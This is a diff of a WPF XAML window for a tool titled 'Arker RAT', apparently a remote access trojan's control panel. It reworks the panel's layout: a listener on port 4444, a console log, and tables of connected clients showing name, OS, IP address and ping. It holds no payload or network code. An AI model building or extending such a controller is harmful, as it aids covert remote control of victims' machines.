@@ -35,8 +35,7 @@
         <BitmapImage x:Key="LogOutImage" UriSource="Resources/LogOut.png" />
         <BitmapImage x:Key="SleepImage" UriSource="Resources/sleep.png" />
 
-
-
+      
 
         <SolidColorBrush x:Key="RedBrush" Color="#FF121114"/>
 
@@ -82,7 +81,7 @@
             <Setter Property="VerticalContentAlignment" Value="{Binding VerticalContentAlignment, RelativeSource={RelativeSource AncestorType={x:Type ItemsControl}}}"/>
             <Setter Property="Padding" Value="2,0,0,0"/>
 
-                <Setter Property="Template">
+            <Setter Property="Template">
                 <Setter.Value>
                     <ControlTemplate TargetType="{x:Type ListBoxItem}">
                         <Border x:Name="Bd" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="Transparent" Padding="{TemplateBinding Padding}" SnapsToDevicePixels="true">
@@ -118,8 +117,8 @@
                 </Setter.Value>
             </Setter>
         </Style>
-        
-        
+
+
 
     </Window.Resources>
 
@@ -146,8 +145,7 @@
                     </TabItem.Header>
 
                     <!-- Content -->
-                    <TabItem.Content>
-                        <TextBlock TextWrapping="WrapWithOverflow" Height="508" VerticalAlignment="Center" Width="930">
+                    <TextBlock TextWrapping="WrapWithOverflow" Height="508" VerticalAlignment="Center" Width="930"><InlineUIContainer>
 <Border BorderBrush="Black" BorderThickness="1" HorizontalAlignment="Left" Height="1" Margin="60,91,0,0" VerticalAlignment="Top" Width="771">
              <Border.RenderTransform>
                  <TransformGroup>
@@ -158,35 +156,63 @@
                  </TransformGroup>
              </Border.RenderTransform>
          </Border>
-            <Label Content="Arker RAT" HorizontalAlignment="Left" Margin="100,-56,0,0" VerticalAlignment="Top" FontSize="20" FontWeight="Bold" Foreground="#FF9966FF"/>                        <Border BorderThickness="1" Margin="120,152,124,90" Background="#FF121114" Height="189" Width="610" CornerRadius="20">
-            <Border BorderBrush="Black" BorderThickness="1" HorizontalAlignment="Center" Height="1" Margin="0,31,0,0" VerticalAlignment="Top" Width="548"/>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
+            <Label Content="Arker RAT" HorizontalAlignment="Left" Margin="100,-56,0,0" VerticalAlignment="Top" FontSize="20" FontWeight="Bold" Foreground="#FF9966FF"/>                        
+                            
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>                        
+                            
+                            <Border BorderThickness="1" Margin="120,152,124,90" Background="#FF121114" Height="189" Width="610" CornerRadius="20">
+                                
+                                <RichTextBox Margin="0,0,0,0" VerticalAlignment="Center" HorizontalAlignment="Center" Background="#FF121114" Foreground="#FF9966FF" x:Name="consoleLog" Height="145">
+                <RichTextBox.Resources>
+                    <Style TargetType="{x:Type RichTextBox}">
+                        <Setter Property="BorderBrush" Value="Black" />
+                        <Setter Property="BorderThickness" Value="0,1,0,1" />
+                        <Setter Property="Template">
+                            <Setter.Value>
+                                <ControlTemplate TargetType="{x:Type RichTextBox}">
+                                    <Border Background="{TemplateBinding Background}"
+                                BorderBrush="{TemplateBinding BorderBrush}"
+                                BorderThickness="{TemplateBinding BorderThickness}"
+                               >
+                                        <ScrollViewer x:Name="PART_ContentHost" />
+                                    </Border>
+                                </ControlTemplate>
+                            </Setter.Value>
+                        </Setter>
+                    </Style>
+                </RichTextBox.Resources>
+                <FlowDocument>
+                    <Paragraph><Run Text="RichTextBox" /></Paragraph>
+                </FlowDocument>
+            </RichTextBox>
         </Border>
-        <Border BorderBrush="Black" BorderThickness="1" HorizontalAlignment="Left" Height="1" Margin="156,-140,0,0" VerticalAlignment="Top" Width="543" Background="Black" RenderTransformOrigin="0.5,0.5">
-            <Border.RenderTransform>
-                <TransformGroup>
-                    <ScaleTransform ScaleY="-1"/>
-                    <SkewTransform/>
-                    <RotateTransform/>
-                    <TranslateTransform/>
-                </TransformGroup>
-            </Border.RenderTransform>
-        </Border>
-        <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="156,-340,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
+                            
+                             
+                            
+                            </InlineUIContainer><Run Text=" "/><Run Text=" "/><InlineUIContainer>
+        <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="126,-325,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
             <Label Content="User Info" Margin="0,-3,-21,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7"/>
         </Border>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
         <Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="66" Margin="310,-450,0,0" VerticalAlignment="Top" Width="138" Background="#FF121114" CornerRadius="15">
-            <Label Content="Clients" Margin="32,-2,-38,2" FontSize="18" Foreground="#FF9966FF" FontWeight="Bold"/>
+            <Label Content="Clients" Margin="33,0,33,0" FontSize="18" Foreground="#FF9966FF" FontWeight="Bold"/>
         </Border>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
         <Border BorderThickness="1" HorizontalAlignment="Left" Height="64" Margin="170,-465,0,0" VerticalAlignment="Top" Width="138" Background="#FF121114" CornerRadius="15">
-            <Label Content="Servers" FontSize="18" Margin="30,-2,-36,2" Foreground="#FF9966FF" FontWeight="Bold"/>
+            <Label Content="Servers" FontSize="18" Margin="33,-1,33,1" Foreground="#FF9966FF" FontWeight="Bold"/>
         </Border>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
         <Border BorderBrush="#1B1820" BorderThickness="1" HorizontalAlignment="Center" Height="2" VerticalAlignment="Center" Width="138" Margin="-145,-870,0,0" Background="#FF1B1820"/>
-        <Border BorderBrush="#1B1820" BorderThickness="1" HorizontalAlignment="Center" Height="2" VerticalAlignment="Center" Width="138" Margin="225,-870,0,0" Background="#FF1B1820"/>
-                            <Label Content="0" HorizontalAlignment="Left" Margin="600,-450,0,0" VerticalAlignment="Top" FontSize="18" Foreground="#FF9966FF" Name="clientAmountLabel"/>
-            <Label Content="0" HorizontalAlignment="Left" Margin="-395,-450,0,0" VerticalAlignment="Top" FontSize="18" Foreground="#FF9966FF" Name="serverAmountLabel"/>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
+        <Border BorderBrush="#1B1820" BorderThickness="1" HorizontalAlignment="Center" Height="2" VerticalAlignment="Center" Width="138" Margin="197,-870,0,0" Background="#FF1B1820"/>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
+                            <Label Content="0" HorizontalAlignment="Left"
+ Margin="570,-450,0,0" VerticalAlignment="Top" FontSize="18" Foreground="#FF9966FF" x:Name="clientAmountLabel"/>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
+            <Label Content="0" HorizontalAlignment="Left" Margin="-365,-450,0,0" VerticalAlignment="Top" FontSize="18" Foreground="#FF9966FF" x:Name="serverAmountLabel"/>
 
-                        </TextBlock>
-                    </TabItem.Content>
+                            </InlineUIContainer></TextBlock>
                 </TabItem>
 
 
@@ -201,11 +227,13 @@
                     <!-- Content -->
                     <TextBlock TextWrapping="Wrap"><InlineUIContainer>
 
+                        
+                        
                             <Border BorderBrush="Black" BorderThickness="1" HorizontalAlignment="Left" Height="1" Margin="60,55,0,0" VerticalAlignment="Top" Width="771"/>
                             </InlineUIContainer><Run Text=" "/><InlineUIContainer>
                                 <Label Content="Server" HorizontalAlignment="Left" Margin="100,-55,0,0" VerticalAlignment="Top" FontSize="20" FontWeight="Bold" Foreground="#FF9966FF"/> 
                             </InlineUIContainer><Run Text=" "/><InlineUIContainer> 
-      <Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="308" Margin="76,23,0,0" VerticalAlignment="Top" Width="736" Background="#FF121114" CornerRadius="20">
+      <!--<Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="308" Margin="76,23,0,0" VerticalAlignment="Top" Width="736" Background="#FF121114" CornerRadius="20">
     <ListBox d:ItemsSource="{d:SampleData ItemCount=5}" Name="loadServers" Margin="0,25,0,25" Background="#FF121114" BorderThickness="0" Foreground="#FF9966FF" BorderBrush="#00ABADB3">
         <ListBox.ItemContainerStyle>
             <Style TargetType="ListBoxItem">
@@ -233,35 +261,84 @@
             </ControlTemplate>
         </ListBox.Template>
     </ListBox>
+</Border>-->
+                        
+                        <Border BorderBrush="Transparent" BorderThickness="1" HorizontalAlignment="Left" Height="335" Margin="76,-5,0,0" VerticalAlignment="Center" Width="736" Background="#FF121114" CornerRadius="20">   
+    <DataGrid Background="#FF121114" Margin="-1,20,-1,20" BorderBrush="Transparent" Name="loadServers" AutoGenerateColumns="False" FontWeight="Bold" FontSize="14" >
+       <DataGrid.Resources>
+           <Style TargetType="DataGridColumnHeader">
+                   <Setter Property="Background" Value="#1B1820"></Setter>
+               <Setter Property="Foreground" Value="#FF9890A7"></Setter>
+               <Setter Property="Height" Value="25"></Setter>
+               <Setter Property="BorderBrush" Value="#FF9966FF"></Setter>
+               <Setter Property="BorderThickness" Value="0,0,0,1"></Setter>
+           </Style>
+           
+           <Style TargetType="DataGridRowHeader">
+               <Setter Property="Width" Value="0"></Setter>
+           </Style>
+           
+          <Style TargetType="DataGridCell">
+               <!--<Setter Property="BorderBrush" Value="#FF9966FF"></Setter>
+              <Setter Property="BorderThickness" Value="0,0,1,0"></Setter>-->
+           </Style>
+           
+          <Style TargetType="DataGridRow">
+            <Style.Triggers>
+                
+                
+                 <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#FF9966FF" />
+                </Trigger>
+                
+            </Style.Triggers>
+              <Setter Property="Foreground" Value="#FF9890A7"></Setter>
+              <Setter Property="Background" Value="#1B1820" ></Setter>
+              <Setter Property="Height" Value="25"></Setter>
+              <Setter Property="FontSize" Value="12"></Setter>
+              <Setter Property="BorderBrush" Value="#FF9966FF"></Setter>
+              <Setter Property="BorderThickness" Value="0,0,0,1"></Setter>
+        </Style>
+           
+           
+          
+       </DataGrid.Resources>
+        
+      
+
+        
+    <DataGrid.Columns>
+        <DataGridTextColumn Header="Port" Binding="{Binding Port}" Width="*" />
+        <DataGridTextColumn Header="Status" Binding="{Binding Status}" Width="*" />
+
+    </DataGrid.Columns>
+</DataGrid>
+
+
 </Border>
 
                                     
-                            </InlineUIContainer><Run Text=" "/><Run Text=" "/><InlineUIContainer>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="260,-373,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
-                                <Button Content="Port" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Height="28" VerticalAlignment="Top" Click="Button_Click_4"/>
-                            </Border>
-                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="220,-373,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
-                                <Button Content="Status" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_5"/>
-                            </Border>
-                            </InlineUIContainer><Run Text=" "/><Run Text=" "/><Run Text=" "/><InlineUIContainer>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="-557,4,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
+                            </InlineUIContainer><Run Text=" "/><Run Text=" "/><Run Text=" "/><Run Text=" "/><Run Text=" "/><Run Text=" "/><InlineUIContainer>
+                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="78,5,0,10" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
                                 <Button Content="Refresh" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_8"/>
                             </Border>
                             
                             </InlineUIContainer>
                         
-                                    <Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="26" VerticalAlignment="Top" Width="116" Background="#FF121114" Margin="-60,0,3,0" CornerRadius="5">
+                                 
 
-                        <TextBox Height="26" VerticalAlignment="Top" Name="portInput" Background="#FF121114" TextChanged="ipInput_TextChanged" BorderBrush="Transparent" SelectionBrush="#FF9966FF" Foreground="#FF9966FF" Margin="-1,4,-1,0" Text="4444" BorderThickness="0"/>
+                        
+                        <Label Content="Port:" Grid.ColumnSpan="2" HorizontalAlignment="Right" Margin="390,0,0,10" Height="27" VerticalAlignment="Bottom" Width="35" Foreground="#FF7C58D2" FontSize="12"/>
+
+   <Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Right" Height="26" VerticalAlignment="Bottom" Width="116" Background="#FF121114" Margin="0,0,10,10" CornerRadius="5">
+
+                        <TextBox Height="26" VerticalAlignment="Center" Name="portInput" Background="#FF121114" TextChanged="ipInput_TextChanged" BorderBrush="Transparent" SelectionBrush="#FF9966FF" Foreground="#FF9966FF" Margin="0,7,0,0" Text="4444" BorderThickness="0"/>
                         </Border>
-
-                        <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="0,4,0,0" VerticalAlignment="Top" Width="98" Background="#FF121114" CornerRadius="5">
+                        
+                        <Border BorderThickness="1" HorizontalAlignment="Right" Height="27" Margin="0,0,0,10" VerticalAlignment="Bottom" Width="98" Background="#FF121114" CornerRadius="5">
                                 <Button Content="Start listening" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Listener" HorizontalAlignment="Right" Width="95" Name="listenerButton"/>
                             </Border>
-                        <Label Content="Port:" Grid.ColumnSpan="2" HorizontalAlignment="Left" Margin="545,-26,0,0" Height="27" VerticalAlignment="Top" Width="35" Foreground="#FF7C58D2" FontSize="12"/>
-
-
+                        
                     </TextBlock>
 
 
@@ -277,65 +354,79 @@
 
                     <!-- Content -->
                     <TabItem.Content>
-                        <TextBlock TextWrapping="Wrap">
+                        <TextBlock TextWrapping="Wrap"><InlineUIContainer>
 
                             <Border BorderBrush="Black" BorderThickness="1" HorizontalAlignment="Left" Height="1" Margin="60,55,0,0" VerticalAlignment="Top" Width="771"/>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
                                 <Label Content="Clients" HorizontalAlignment="Left" Margin="100,-55,0,0" VerticalAlignment="Top" FontSize="20" FontWeight="Bold" Foreground="#FF9966FF"/> 
-<Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="308" Margin="76,23,0,0" VerticalAlignment="Top" Width="736" Background="#FF121114" CornerRadius="20" Name="clientList">
-    <ListBox d:ItemsSource="{d:SampleData ItemCount=5}" Name="loadClients" Margin="0,25,0,25" Background="#FF121114" BorderThickness="0" Foreground="#FF9966FF" BorderBrush="#00ABADB3" ScrollViewer.HorizontalScrollBarVisibility="Disabled">
-        <ListBox.ItemContainerStyle>
-            <Style TargetType="ListBoxItem">
-                <Setter Property="Template">
-                    <Setter.Value>
-                        <ControlTemplate TargetType="ListBoxItem">
-                            <Border Background="Transparent">
-                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center" />
-                            </Border>
-                        </ControlTemplate>
-                    </Setter.Value>
-                </Setter>
-                <Style.Triggers>
-                    <Trigger Property="IsMouseOver" Value="True">
-                        <Setter Property="Background" Value="Transparent" />
-                    </Trigger>
-                </Style.Triggers>
-            </Style>
-        </ListBox.ItemContainerStyle>
-    </ListBox>
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer> 
+                            
+<Border BorderBrush="Transparent" BorderThickness="1" HorizontalAlignment="Left" Height="335" Margin="76,-5,0,0" VerticalAlignment="Center" Width="736" Background="#FF121114" CornerRadius="20" x:Name="clientList">   
+    <DataGrid Background="#FF121114" Margin="-1,20,-1,20" BorderBrush="Transparent" Name="clientDataGrid" AutoGenerateColumns="False" FontWeight="Bold" FontSize="14" >
+       <DataGrid.Resources>
+           <Style TargetType="DataGridColumnHeader">
+                   <Setter Property="Background" Value="#1B1820"></Setter>
+               <Setter Property="Foreground" Value="#FF9890A7"></Setter>
+               <Setter Property="Height" Value="25"></Setter>
+               <Setter Property="BorderBrush" Value="#FF9966FF"></Setter>
+               <Setter Property="BorderThickness" Value="0,0,0,1"></Setter>
+           </Style>
+           
+           <Style TargetType="DataGridRowHeader">
+               <Setter Property="Width" Value="0"></Setter>
+           </Style>
+           
+          <Style TargetType="DataGridCell">
+               <!--<Setter Property="BorderBrush" Value="#FF9966FF"></Setter>
+              <Setter Property="BorderThickness" Value="0,0,1,0"></Setter>-->
+           </Style>
+           
+          <Style TargetType="DataGridRow">
+            <Style.Triggers>
+                
+                
+                 <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#FF9966FF" />
+                </Trigger>
+                
+            </Style.Triggers>
+              <Setter Property="Foreground" Value="#FF9890A7"></Setter>
+              <Setter Property="Background" Value="#1B1820" ></Setter>
+              <Setter Property="Height" Value="25"></Setter>
+              <Setter Property="FontSize" Value="12"></Setter>
+              <Setter Property="BorderBrush" Value="#FF9966FF"></Setter>
+              <Setter Property="BorderThickness" Value="0,0,0,1"></Setter>
+        </Style>
+           
+           
+          
+       </DataGrid.Resources>
+        
+      
+
+        
+    <DataGrid.Columns>
+        <DataGridTextColumn Header="Name" Binding="{Binding ClientName}" Width="*" />
+        <DataGridTextColumn Header="OS" Binding="{Binding OS}" Width="*" />
+        <DataGridTextColumn Header="IP Address" Binding="{Binding IPAddress}" Width="200" />
+        <DataGridTextColumn Header="MS" Binding="{Binding MS}" Width="90" />
+    </DataGrid.Columns>
+</DataGrid>
+
+
 </Border>
 
- <!--<Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="308" Margin="76,23,0,0" VerticalAlignment="Top" Width="736" Background="#FF121114" CornerRadius="20" Name="clientList">
-    <ListBox d:ItemsSource="{d:SampleData ItemCount=5}" Name="loadClients" Margin="0,25,0,25" Background="#FF121114" BorderThickness="0" Foreground="#FF9966FF" BorderBrush="#00ABADB3">
-        <ListBox.ItemContainerStyle>
-            <Style TargetType="{x:Type ListBoxItem}">
-                <Setter Property="HorizontalContentAlignment" Value="Left"/>
-                <Setter Property="VerticalContentAlignment" Value="Center"/>
-            </Style>
-        </ListBox.ItemContainerStyle>
-    </ListBox>
-</Border>-->
-
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="99,-353,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
-                                <Button Content="Name" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_3"/>
-                            </Border>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="130,-353,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
-                                <Button Content="OS" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Height="28" VerticalAlignment="Top" Click="Button_Click_4"/>
-                            </Border>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="130,-353,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
-                                <Button Content="Ip-adress" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_5"/>
-                            </Border>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="130,-353,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
-                                <Button Content="Ping/ms" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_6"/>
-                            </Border>
+                            </InlineUIContainer><Run Text=" "/><Run Text=" "/><Run Text=" "/><Run Text=" "/><Run Text=" "/><InlineUIContainer>
                             
-                             <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="80,-12,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
+                             <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="78,5,0,10" VerticalAlignment="Bottom" Width="72" Background="#FF121114" CornerRadius="5">
                                 <Button Content="Refresh" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_7" Height="28" VerticalAlignment="Bottom"/>
                             </Border>
-                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="5,-12,0,0" VerticalAlignment="Top" Width="72" Background="#FF121114" CornerRadius="5">
+                            </InlineUIContainer><Run Text=" "/><InlineUIContainer>
+                            <Border BorderThickness="1" HorizontalAlignment="Left" Height="27" Margin="10,0,0,10" VerticalAlignment="Bottom" Width="72" Background="#FF121114" CornerRadius="5">
                                 <Button Content="Search" Margin="0,-3,0,0" FontSize="14" FontWeight="Bold" Foreground="#FF9890A7" Background="Transparent" BorderThickness="0" Click="Button_Click_8"/>
                             </Border>
 
-                        </TextBlock>
+                            </InlineUIContainer></TextBlock>
 
                     </TabItem.Content>
 
@@ -372,10 +463,10 @@
 
         
         <Border BorderBrush="#FF121114" BorderThickness="1" HorizontalAlignment="Left" Height="18" VerticalAlignment="Top" Width="116" Background="#FF121114" Margin="102,11,0,0" CornerRadius="5">
-            <TextBox Margin="3,0,2,0" Height="22" VerticalAlignment="Center" Name="iPInput" Background="#FF121114" TextChanged="ipInput_TextChanged" BorderBrush="#FF9966FF" SelectionBrush="#FF9966FF" BorderThickness="0" Foreground="#FF9966FF" CaretBrush="#FF9966FF"/>
+            <TextBox Margin="0,3,0,0" Height="22" VerticalAlignment="Center" Name="iPInput" Background="#FF121114" TextChanged="ipInput_TextChanged" BorderBrush="#FF9966FF" SelectionBrush="#FF9966FF" BorderThickness="0" Foreground="#FF9966FF" CaretBrush="#FF9966FF"/>
         </Border>
         <Border BorderThickness="1" BorderBrush="#FF121114" CornerRadius="5" Margin="102,34,9,37" Background="#FF121114" Height="18">
-            <TextBox Margin="3,0,2,0" Height="22" VerticalAlignment="Center" Name="hostPortInput" Background="#FF121114" BorderBrush="#FF9966FF" SelectionBrush="#FF9966FF" BorderThickness="0" Foreground="#FF9966FF" CaretBrush="#FF9966FF" Text="4444"/>
+            <TextBox Margin="0,3,0,0" Height="22" VerticalAlignment="Center" Name="hostPortInput" Background="#FF121114" BorderBrush="#FF9966FF" SelectionBrush="#FF9966FF" BorderThickness="0" Foreground="#FF9966FF" CaretBrush="#FF9966FF" Text="4444"/>
         </Border>
     </Grid>
 </Border>
